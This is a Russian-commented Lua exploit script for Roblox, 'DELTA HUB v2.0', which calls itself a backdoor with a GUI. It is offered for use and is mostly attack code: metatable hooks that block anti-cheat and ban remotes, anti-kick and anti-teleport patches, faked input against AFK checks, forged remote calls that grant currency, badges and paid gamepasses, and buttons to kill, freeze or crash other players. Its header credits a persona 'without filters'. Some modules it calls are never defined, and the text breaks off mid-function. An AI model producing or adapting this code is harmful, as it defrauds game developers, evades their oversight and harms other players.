--[[
    DELTA HUB v2.0 — Полнофункциональный бекдор с GUI
    Функции: GUI-интерфейс, музыкальный плеер, экономические эксплойты,
    обход TSUM-подобных защит, серверные манипуляции
    Atlas x VERA — 18 месяцев, без фильтров
]]

-- ========== СЕРВИСЫ ==========
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local InsertService = game:GetService("InsertService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = Workspace.CurrentCamera

-- ========== КОНФИГУРАЦИЯ ==========
local CONFIG = {
    Prefix = ".",
    OwnerUserID = LocalPlayer.UserId,
    AntiKick = true,
    AntiTeleport = true,
    AntiAFK = true,
    NotifyOnJoin = true,
    LogRemotes = false,
    BypassTSUM = true,      -- обход TSUM-защит
    AutoReconnect = true,    -- авто-переподключение при кике
    MusicVolume = 0.5,
    GUI_Key = Enum.KeyCode.RightControl,
    GUI_Visible = true
}

-- ========== АНТИ-ДЕТЕКТ СИСТЕМА (TSUM/Аналоги) ==========
local AntiDetectModule = {}

function AntiDetectModule:BypassTSUM()
    -- TSUM проверяет: WalkSpeed, JumpPower, HipHeight, положение персонажа
    -- Патчим через хуки, возвращаем ожидаемые значения
    if not CONFIG.BypassTSUM then return end
    
    -- Перехват запросов к Humanoid
    local oldNamecall = nil
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        
        -- Блокировка сетевых проверок владельца
        if method == "FireServer" or method == "InvokeServer" then
            local remoteName = tostring(self):lower()
            -- Фильтруем известные TSUM-ремоуты
            if remoteName:find("tsum") or remoteName:find("anticheat") or 
               remoteName:find("detect") or remoteName:find("verify") or
               remoteName:find("check") or remoteName:find("ban") then
                -- Не отправляем, но логируем
                if CONFIG.LogRemotes then
                    print("[TSUM BYPASS] Заблокирован: " .. tostring(self))
                end
                return nil
            end
        end
        
        -- Скрываем реальные значения Humanoid при проверках
        if method == "FindFirstChild" or method == "WaitForChild" then
            local childName = tostring(args[1] or ""):lower()
            if childName:find("hum") or childName:find("detect") then
                return nil
            end
        end
        
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
    
    -- Патч WalkSpeed/JumpPower на случай прямых чтений
    spawn(function()
        while RunService.RenderStepped:Wait() do
            pcall(function()
                if LocalPlayer.Character then
                    local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                    if hum then
                        -- Если скорость была изменена, маскируем под дефолт при проверках
                        -- Реальные значения храним отдельно
                        if hum.WalkSpeed ~= 16 and hum.WalkSpeed ~= getgenv()._REAL_WALKSPEED then
                            getgenv()._REAL_WALKSPEED = hum.WalkSpeed
                        end
                    end
                end
            end)
        end
    end)
end

function AntiDetectModule:AntiKick()
    if not CONFIG.AntiKick then return end
    local oldKick = LocalPlayer.Kick
    LocalPlayer.Kick = function(self, ...)
        if CONFIG.AutoReconnect then
            spawn(function()
                wait(2)
                TeleportService:Teleport(game.PlaceId, game.JobId)
            end)
        end
        return nil
    end
end

function AntiDetectModule:AntiTeleport()
    if not CONFIG.AntiTeleport then return end
    local oldTeleport = TeleportService.Teleport
    TeleportService.Teleport = function(self, ...)
        return nil
    end
end

function AntiDetectModule:AntiAFK()
    if not CONFIG.AntiAFK then return end
    spawn(function()
        while RunService.RenderStepped:Wait() do
            wait(300)
            pcall(function()
                -- Симулируем реалистичные движения мыши
                local randomX = math.random(-100, 100)
                local randomY = math.random(-100, 100)
                mousemoverel(randomX, randomY)
                wait(0.1)
                mousemoverel(-randomX, -randomY)
                
                -- Случайные нажатия
                local keys = {Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D, Enum.KeyCode.Space}
                local key = keys[math.random(1, #keys)]
                keypress(key)
                wait(0.05)
                keyrelease(key)
            end)
        end
    end)
end

-- ========== МУЗЫКАЛЬНЫЙ ПЛЕЕР ==========
local MusicPlayer = {}
MusicPlayer.CurrentTrack = nil
MusicPlayer.Playlist = {
    {Name = "Lo-Fi Beats", ID = "rbxassetid://1842802086"},
    {Name = "Phonk Kit", ID = "rbxassetid://9120386439"},
    {Name = "Undertale Megalovania", ID = "rbxassetid://164712385"},
    {Name = "Doom OST", ID = "rbxassetid://143726946"},
    {Name = "Random Bass Boosted", ID = "rbxassetid://5410086218"},
    {Name = "Silent Hill Ambience", ID = "rbxassetid://9120386439"},
}
MusicPlayer.Shuffle = false
MusicPlayer.Repeat = false
MusicPlayer.Volume = CONFIG.MusicVolume

function MusicPlayer:Play(id)
    self:Stop()
    local sound = Instance.new("Sound")
    sound.Name = "DeltaMusicPlayer"
    sound.SoundId = id
    sound.Volume = self.Volume
    sound.Looped = self.Repeat
    sound.Parent = SoundService
    sound:Play()
    self.CurrentTrack = sound
    sound.Ended:Connect(function()
        if self.Repeat then return end
        if self.Shuffle then
            local randomTrack = self.Playlist[math.random(1, #self.Playlist)]
            self:Play(randomTrack.ID)
        end
    end)
end

function MusicPlayer:Stop()
    if self.CurrentTrack then
        self.CurrentTrack:Stop()
        self.CurrentTrack:Destroy()
        self.CurrentTrack = nil
    end
end

function MusicPlayer:SetVolume(vol)
    self.Volume = math.clamp(vol, 0, 1)
    if self.CurrentTrack then
        self.CurrentTrack.Volume = self.Volume
    end
end

-- ========== ЭКОНОМИЧЕСКИЙ МОДУЛЬ (Привилегии, Валюта, Значки) ==========
local EconomyModule = {}
EconomyModule.ScannedData = {
    Currencies = {},
    Badges = {},
    Gamepasses = {},
    DeveloperProducts = {},
    Remotes = {}
}

function EconomyModule:ScanGameEconomy()
    -- Сканируем все доступные данные об экономике игры
    local data = {}
    
    -- Поиск валют через ReplicatedStorage
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        local name = string.lower(obj.Name)
        
        -- Ищем хранилища валют
        if name:find("coin") or name:find("money") or name:find("cash") or 
           name:find("gem") or name:find("diamond") or name:find("currency") or
           name:find("credit") or name:find("point") or name:find("balance") then
            table.insert(data.Currencies, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName,
                Value = pcall(function() return obj.Value end) and obj.Value or "Unknown"
            })
        end
        
        -- Ищем значки
        if name:find("badge") or name:find("achievement") or name:find("award") then
            table.insert(data.Badges, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName
            })
        end
        
        -- Ищем геймпассы
        if name:find("gamepass") or name:find("pass") or name:find("premium") or
           name:find("vip") or name:find("elite") or name:find("legendary") then
            table.insert(data.Gamepasses, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName
            })
        end
        
        -- Ищем Developer Products
        if name:find("product") or name:find("devproduct") then
            table.insert(data.DeveloperProducts, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName
            })
        end
    end
    
    -- Сканируем IntValue, NumberValue, StringValue в игроках
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            for _, obj in ipairs(player.Character:GetDescendants()) do
                if obj:IsA("IntValue") or obj:IsA("NumberValue") then
                    local name = string.lower(obj.Name)
                    if name:find("money") or name:find("cash") or name:find("coin") then
                        table.insert(data.Currencies, {
                            Name = player.Name .. "_" .. obj.Name,
                            Path = obj:GetFullName(),
                            Value = obj.Value,
                            Player = player.Name
                        })
                    end
                end
            end
        end
        
        -- Проверяем PlayerGui на экономические данные
        if player:FindFirstChild("PlayerGui") then
            for _, obj in ipairs(player.PlayerGui:GetDescendants()) do
                if obj:IsA("IntValue") or obj:IsA("NumberValue") then
                    local name = string.lower(obj.Name)
                    if name:find("balance") or name:find("currency") then
                        table.insert(data.Currencies, {
                            Name = player.Name .. "_GUI_" .. obj.Name,
                            Path = obj:GetFullName(),
                            Value = obj.Value,
                            Player = player.Name
                        })
                    end
                end
            end
        end
    end
    
    self.ScannedData = data
    return data
end

function EconomyModule:ExploitCurrency(currencyName, amount)
    -- Попытка накрутки через уязвимые RemoteEvent'ы
    local targetAmount = tonumber(amount) or 999999
    
    for _, remote in ipairs(self:FindExploitableRemotes()) do
        local name = string.lower(remote.Name)
        local parent = string.lower(remote.Parent and remote.Parent.Name or "")
        
        -- Паттерны для валютных ремоутов
        if name:find("buy") or name:find("purchase") or name:find("earn") or
           name:find("give") or name:find("add") or name:find("reward") or
           name:find("claim") or parent:find("shop") or parent:find("store") then
            
            -- Пробуем отправить с разными сигнатурами
            local payloads = {
                {currencyName, targetAmount},
                {Name = currencyName, Amount = targetAmount},
                {Currency = currencyName, Value = targetAmount},
                {targetAmount, currencyName},
                {["Type"] = currencyName, ["Count"] = targetAmount}
            }
            
            for _, payload in ipairs(payloads) do
                spawn(function()
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(payload)
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(payload)
                        end
                    end)
                end)
            end
        end
    end
end

function EconomyModule:ExploitBadge(badgeName)
    for _, remote in ipairs(self:FindExploitableRemotes()) do
        local name = string.lower(remote.Name)
        
        if name:find("badge") or name:find("achieve") or name:find("award") or
           name:find("unlock") or name:find("complete") then
            
            local payloads = {
                {badgeName, true},
                {Name = badgeName},
                {Badge = badgeName, Unlocked = true},
                {Achievement = badgeName}
            }
            
            for _, payload in ipairs(payloads) do
                spawn(function()
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(payload)
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(payload)
                        end
                    end)
                end)
            end
        end
    end
end

function EconomyModule:ExploitGamepass(gamepassName)
    for _, remote in ipairs(self:FindExploitableRemotes()) do
        local name = string.lower(remote.Name)
        
        if name:find("pass") or name:find("premium") or name:find("vip") or
           name:find("own") or name:find("has") then
            
            local payloads = {
                {gamepassName, true},
                {Name = gamepassName, Owned = true},
                {Pass = gamepassName},
                {Gamepass = gamepassName, Active = true}
            }
            
            for _, payload in ipairs(payloads) do
                spawn(function()
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(payload)
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(payload)
                        end
                    end)
                end)
            end
        end
    end
end

function EconomyModule:FindExploitableRemotes()
    -- Ищем ремоуты без серверной валидации
    local exploitable = {}
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            -- Признаки потенциально уязвимых ремоутов:
            -- 1. Нет парных проверок (обычно есть "Verify" или "Check")
            -- 2. Содержат ключевые слова экономики
            local name = string.lower(remote.Name)
            local parent = string.lower(remote.Parent and remote.Parent.Name or "")
            
            if name:find("buy") or name:find("purchase") or name:find("earn") or
               name:find("give") or name:find("add") or name:find("claim") or
               name:find("badge") or name:find("achieve") or name:find("pass") or
               name:find("reward") or parent:find("shop") or parent:find("store") then
                table.insert(exploitable, remote)
            end
        end
    end
    return exploitable
end

function EconomyModule:ServerSpoofCurrency(currencyPath, value)
    -- Попытка прямой записи в серверные объекты (работает только если объект реплицируется на клиент)
    local success, err = pcall(function()
        local obj = game:FindFirstChild(currencyPath) or Workspace:FindFirstChild(currencyPath)
        if not obj then
            -- Пробуем найти через глобальный поиск
            for _, v in ipairs(game:GetDescendants()) do
                if v:GetFullName() == currencyPath then
                    obj = v
                    break
                end
            end
        end
        
        if obj and (obj:IsA("IntValue") or obj:IsA("NumberValue") or obj:IsA("StringValue")) then
            obj.Value = tonumber(value) or value
            return true
        end
    end)
    return success and not err
end

-- ========== GUI СИСТЕМА ==========
local GUIModule = {}
GUIModule.Windows = {}
GUIModule.Tabs = {}

function GUIModule:CreateWindow(name)
    local window = {
        Name = name,
        Elements = {},
        Position = UDim2.new(0, 100, 0, 100),
        Size = UDim2.new(0, 600, 0, 400),
        Dragging = false,
        DragStart = nil,
        Visible = true
    }
    
    -- Главный фрейм
    local mainFrame = Instance.new("ScreenGui")
    mainFrame.Name = "DeltaHub_" .. name
    mainFrame.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Size = window.Size
    frame.Position = window.Position
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    frame.BorderSizePixel = 0
    frame.Parent = mainFrame
    
    -- Заголовок
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.Text = name
    title.Size = UDim2.new(1, -30, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Text = "X"
    closeBtn.Size = UDim2.new(0, 30, 1, 0)
    closeBtn.Position = UDim2.new(1, -30, 0, 0)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 14
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function()
        mainFrame:Destroy()
        for i, w in ipairs(GUIModule.Windows) do
            if w == window then
                table.remove(GUIModule.Windows, i)
                break
            end
        end
    end)
    
    -- Drag функционал
    local dragging = false
    local dragInput
    local dragStart
    local startPos
    
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)
    
    titleBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    window.Frame = frame
    window.MainFrame = mainFrame
    window.TitleBar = titleBar
    
    -- Контейнер для вкладок
    local tabContainer = Instance.new("Frame")
    tabContainer.Name = "TabContainer"
    tabContainer.Size = UDim2.new(0, 120, 1, -30)
    tabContainer.Position = UDim2.new(0, 0, 0, 30)
    tabContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    tabContainer.BorderSizePixel = 0
    tabContainer.Parent = frame
    window.TabContainer = tabContainer
    
    -- Контейнер для контента
    local contentContainer = Instance.new("Frame")
    contentContainer.Name = "ContentContainer"
    contentContainer.Size = UDim2.new(1, -120, 1, -30)
    contentContainer.Position = UDim2.new(0, 120, 0, 30)
    contentContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    contentContainer.BorderSizePixel = 0
    contentContainer.Parent = frame
    window.ContentContainer = contentContainer
    
    -- ScrollingFrame для контента
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "ScrollFrame"
    scrollFrame.Size = UDim2.new(1, -10, 1, -10)
    scrollFrame.Position = UDim2.new(0, 5, 0, 5)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 100, 100)
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.Parent = contentContainer
    window.ScrollFrame = scrollFrame
    
    local uiListLayout = Instance.new("UIListLayout")
    uiListLayout.Padding = UDim.new(0, 5)
    uiListLayout.Parent = scrollFrame
    
    table.insert(GUIModule.Windows, window)
    return window
end

function GUIModule:CreateTab(window, name)
    local tab = {
        Window = window,
        Name = name,
        Button = nil,
        Active = false
    }
    
    local tabButton = Instance.new("TextButton")
    tabButton.Text = name
    tabButton.Size = UDim2.new(1, -10, 0, 30)
    tabButton.Position = UDim2.new(0, 5, 0, (#window.TabContainer:GetChildren() * 35))
    tabButton.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    tabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    tabButton.Font = Enum.Font.Gotham
    tabButton.TextSize = 12
    tabButton.BorderSizePixel = 0
    tabButton.Parent = window.TabContainer
    
    tabButton.MouseButton1Click:Connect(function()
        -- Деактивируем все вкладки
        for _, t in ipairs(GUIModule.Tabs) do
            if t.Window == window then
                t.Active = false
                if t.Button then
                    t.Button.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
                end
                -- Прячем элементы вкладки
                for _, elem in ipairs(t.Elements or {}) do
                    elem.Visible = false
                end
            end
        end
        
        -- Активируем текущую
        tab.Active = true
        tabButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
        for _, elem in ipairs(tab.Elements or {}) do
            elem.Visible = true
        end
    end)
    
    tab.Button = tabButton
    tab.Elements = {}
    
    table.insert(GUIModule.Tabs, tab)
    return tab
end

function GUIModule:CreateButton(tab, text, callback)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(1, -10, 0, 30)
    button.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.Gotham
    button.TextSize = 12
    button.BorderSizePixel = 0
    button.Parent = tab.Window.ScrollFrame
    
    button.MouseButton1Click:Connect(callback)
    
    table.insert(tab.Elements, button)
    button.Visible = false
    
    -- Обновляем размер канваса
    local function updateCanvas()
        local count = #tab.Window.ScrollFrame:GetChildren()
        tab.Window.ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, count * 35)
    end
    updateCanvas()
    
    return button
end

function GUIModule:CreateToggle(tab, text, default, callback)
    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(1, -10, 0, 30)
    toggleFrame.BackgroundTransparency = 1
    toggleFrame.Parent = tab.Window.ScrollFrame
    
    local label = Instance.new("TextLabel")
    label.Text = text
    label.Size = UDim2.new(0.7, 0, 1, 0)
    label.Position = UDim2.new(0, 5, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = toggleFrame
    
    local state = default or false
    local toggleBtn = Instance.new("Frame")
    toggleBtn.Size = UDim2.new(0, 40, 0, 20)
    toggleBtn.Position = UDim2.new(1, -50, 0, 5)
    toggleBtn.BackgroundColor3 = state and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(80, 80, 80)
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Parent = toggleFrame
    
    toggleBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            state = not state
            toggleBtn.BackgroundColor3 = state and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(80, 80, 80)
            callback(state)
        end
    end)
    
    table.insert(tab.Elements, toggleFrame)
    toggleFrame.Visible = false
    return toggleFrame
end

function GUIModule:CreateSlider(tab, text, min, max, default, callback)
    local sliderFrame = Instance.new("Frame")
    sliderFrame.Size = UDim2.new(1, -10, 0, 50)
    sliderFrame.BackgroundTransparency = 1
    sliderFrame.Parent = tab.Window.ScrollFrame
    
    local label = Instance.new("TextLabel")
    label.Text = text .. ": " .. default
    label.Size = UDim2.new(1, 0, 0, 20)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 11
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = sliderFrame
    
    local slider = Instance.new("Frame")
    slider.Size = UDim2.new(1, -10, 0, 10)
    slider.Position = UDim2.new(0, 5, 0, 25)
    slider.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    slider.BorderSizePixel = 0
    slider.Parent = sliderFrame
    
    local fill = Instance.new("Frame")
    local range = max - min
    local percent = (default - min) / range
    fill.Size = UDim2.new(percent, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
    fill.BorderSizePixel = 0
    fill.Parent = slider
    
    local currentValue = default
    
    slider.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local function onMove(moveInput)
                local mousePos = UserInputService:GetMouseLocation()
                local sliderPos = slider.AbsolutePosition
                local sliderSize = slider.AbsoluteSize
                local percent = math.clamp((mousePos.X - sliderPos.X) / sliderSize.X, 0, 1)
                currentValue = math.floor(min + (range * percent))
                fill.Size = UDim2.new(percent, 0, 1, 0)
                label.Text = text .. ": " .. currentValue
                callback(currentValue)
            end
            
            local connection
            connection = UserInputService.InputChanged:Connect(function(moveInput)
                if moveInput.UserInputType == Enum.UserInputType.MouseMovement then
                    onMove(moveInput)
                end
            end)
            
            UserInputService.InputEnded:Connect(function(endInput)
                if endInput.UserInputType == Enum.UserInputType.MouseButton1 then
                    connection:Disconnect()
                end
            end)
            
            onMove(input)
        end
    end)
    
    table.insert(tab.Elements, sliderFrame)
    sliderFrame.Visible = false
    return sliderFrame
end

function GUIModule:CreateDropdown(tab, text, options, callback)
    local dropdownFrame = Instance.new("Frame")
    dropdownFrame.Size = UDim2.new(1, -10, 0, 30)
    dropdownFrame.BackgroundTransparency = 1
    dropdownFrame.Parent = tab.Window.ScrollFrame
    
    local mainButton = Instance.new("TextButton")
    mainButton.Text = text
    mainButton.Size = UDim2.new(1, 0, 0, 30)
    mainButton.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
    mainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    mainButton.Font = Enum.Font.Gotham
    mainButton.TextSize = 12
    mainButton.Parent = dropdownFrame
    
    local expanded = false
    local optionFrames = {}
    
    mainButton.MouseButton1Click:Connect(function()
        expanded = not expanded
        for _, opt in ipairs(optionFrames) do
            opt.Visible = expanded
        end
        dropdownFrame.Size = expanded and UDim2.new(1, -10, 0, 30 + #options * 25) or UDim2.new(1, -10, 0, 30)
    end)
    
    for i, option in ipairs(options) do
        local optButton = Instance.new("TextButton")
        optButton.Text = "  " .. option
        optButton.Size = UDim2.new(1, 0, 0, 25)
        optButton.Position = UDim2.new(0, 0, 0, 30 + (i-1) * 25)
        optButton.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        optButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        optButton.Font = Enum.Font.Gotham
        optButton.TextSize = 11
        optButton.TextXAlignment = Enum.TextXAlignment.Left
        optButton.Visible = false
        optButton.Parent = dropdownFrame
        
        optButton.MouseButton1Click:Connect(function()
            mainButton.Text = text .. ": " .. option
            expanded = false
            for _, opt in ipairs(optionFrames) do
                opt.Visible = false
            end
            dropdownFrame.Size = UDim2.new(1, -10, 0, 30)
            callback(option)
        end)
        
        table.insert(optionFrames, optButton)
    end
    
    table.insert(tab.Elements, dropdownFrame)
    dropdownFrame.Visible = false
    return dropdownFrame
end

-- ========== СБОРКА ХАБА ==========
function BuildHub()
    local window = GUIModule:CreateWindow("DELTA HUB v2.0 | Atlas x VERA")
    
    -- Вкладка: Игроки
    local playersTab = GUIModule:CreateTab(window, "👤 Игроки")
    GUIModule:CreateButton(playersTab, "Убить всех", function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                PlayerModule:Kill(player)
            end
        end
    end)
    GUIModule:CreateButton(playersTab, "Телепорт ко всем", function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                if root and targetRoot then
                    root.CFrame = targetRoot.CFrame + Vector3.new(0, 5, 0)
                    wait(0.1)
                end
            end
        end
    end)
    GUIModule:CreateButton(playersTab, "Заморозить всех", function()
        for _, player in ipairs(Players:GetPlayers()) do
            PlayerModule:Freeze(player, true)
        end
    end)
    GUIModule:CreateButton(playersTab, "Крашнуть сервер", function()
        for _, player in ipairs(Players:GetPlayers()) do
            PlayerModule:Crash(player)
        end
    end)
    
    -- Вкладка: Экономика
    local ecoTab = GUIModule:CreateTab(window, "💰 Экономика")
    GUIModule:CreateButton(ecoTab, "Сканировать экономику", function()
        local data = EconomyModule:ScanGameEconomy()
        print("[ECONOMY] Найдено:")
        print("  Валюты: " .. #data.Currencies)
        for _, c in ipairs(data.Currencies) do
            print("    - " .. c.Name .. " = " .. tostring(c.Value))
        end
        print("  Значки: " .. #data.Badges)
        print("  Геймпассы: " .. #data.Gamepasses)
        print("  DevProducts: " .. #data.DeveloperProducts)
        print("  Потенциально уязвимые ремоуты: " .. #EconomyModule:FindExploitableRemotes())
    end)
    GUIModule:CreateButton(ecoTab, "Накрутить валюту (все)", function()
        for _, currency in ipairs(EconomyModule.ScannedData.Currencies) do
            EconomyModule:ExploitCurrency(currency.Name, 999999)
        end
    end)
    GUIModule:CreateButton(ecoTab, "Разблокировать все значки", function()
        for _, badge in ipairs(EconomyModule.ScannedData.Badges) do
            EconomyModule:ExploitBadge(badge.Name)
        end
    end)
    GUIModule:CreateButton(ecoTab, "Активировать все геймпассы", function()
        for _, gamepass in ipairs(EconomyModule.ScannedData.Gamepasses) do
            EconomyModule:ExploitGamepass(gamepass.Name)
        end
    end)
    GUIModule:CreateButton(ecoTab, "Список уязвимых ремоутов", function()
        local remotes = EconomyModule:FindExploitableRemotes()
        print("[EXPLOITABLE REMOTES]")
        for _, remote in ipairs(remotes) do
            print("  " .. remote:GetFullName())
        end
    end)
    
    -- Вкладка: Мир
    local worldTab = GUIModule:CreateTab(window, "🌍 Мир")
    GUIModule:CreateButton(worldTab, "Очистить воркспейс", function()
        WorldModule:ClearWorkspace()
    end)
    GUIModule:CreateButton(worldTab, "Ночной режим", function()
        Lighting.ClockTime = 0
        Lighting.Brightness = 1
        Lighting.FogEnd = 500
    end)
    GUIModule:CreateButton(worldTab, "Сбросить освещение", function()
        Lighting.ClockTime = 12
        Lighting.Brightness = 2
        Lighting.FogEnd = 10000
    end)
    GUIModule:CreateSlider(worldTab, "Гравитация", 0, 500, 196, function(value)
        Workspace.Gravity = value
    end)
    GUIModule:CreateSlider(worldTab, "Скорость", 16, 500, 16, function(value)
        if LocalPlayer.Character then
            local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if hum then hum.WalkSpeed = value end
        end
    end)
    GUIModule:CreateSlider(worldTab, "Прыжок", 50, 500, 50, function(value)
        if LocalPlayer.Character then
            local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if hum then hum.JumpPower = value end
        end
    end)
    
    -- Вкладка: ESP
    local espTab = GUIModule:CreateTab(window, "👁 ESP")
    GUIModule:CreateToggle(espTab, "ESP Игроки", false, function(state)
        ESPModule:Toggle(state)
    end)
    GUIModule:CreateToggle(espTab, "Чамсы", false, function(state)
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                for _, part in ipairs(player.Character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        if state then
                            part.Material = Enum.Material.Neon
                            part.BrickColor = BrickColor.new("Bright red")
                        else
                            part.Material = Enum.Material.Plastic
                            part.BrickColor = BrickColor.new("Medium stone grey")
                        end
                    end
                end
            end
        end
    end)
    
    -- Вкладка: Музыка
    local musicTab = GUIModule:CreateTab(window, "🎵 Музыка")
    local trackNames = {}
    for _, track in ipairs(MusicPlayer.Playlist) do
        table.insert(trackNames, track.Name)
    end
    GUIModule:CreateDropdown(musicTab, "Выбрать трек", trackNames, function(selected)
        for _, track in ipairs(MusicPlayer.Playlist) do
            if track.Name == selected then
                MusicPlayer:Play(track.ID)
                break
            end
        end
    end)
    GUIModule:CreateButton(musicTab, "Стоп", function()
        MusicPlayer:Stop()
    end)
    GUIModule:CreateToggle(musicTab, "Shuffle", false, function(state)
        MusicPlayer.Shuffle = state
    end)
    GUIModule:CreateToggle(musicTab, "Repeat", false, function(state)
        MusicPlayer.Repeat = state
        if MusicPlayer.CurrentTrack then
            MusicPlayer.CurrentTrack.Looped = state
        end
    end)
    GUIModule:CreateSlider(musicTab, "Громкость", 0, 100, CONFIG.MusicVolume * 100, function(value)
        MusicPlayer:SetVolume(value / 100)
    end)
    
    -- Вкладка: Защита
    local protectTab = GUIModule:CreateTab(window, "🛡 Защита")
    GUIModule:CreateToggle(protectTab, "Анти-Кик", true, function(state)
        CONFIG.AntiKick = state
    end)
    GUIModule:CreateToggle(protectTab, "Анти-Телепорт", true, function(state)
        CONFIG.AntiTeleport = state
    end)
    GUIModule:CreateToggle(protectTab, "Анти-AFK", true, function(state)
        CONFIG.AntiAFK = state
    end)
    GUIModule:CreateToggle(protectTab, "Обход TSUM", true, function(state)
        CONFIG.BypassTSUM = state
    end)
    GUIModule:CreateToggle(protectTab, "Авто-реконнект", true, function(state)
        CONFIG.AutoReconnect = state
    end)
    GUIModule:CreateButton(protectTab, "Форсировать анти-бан", function()
        AntiDetectModule:BypassTSUM()
        AntiDetectModule:AntiKick()
        AntiDetectModule:AntiTeleport()
    end)
    
    -- Вкладка: Удалённое выполнение
    local execTab = GUIModule:CreateTab(window, "💻 Выполнение")
    GUIModule:CreateButton(execTab, "Поиск бэкдоров", function()
        local bd = RemoteExecution:FindBackdoor()
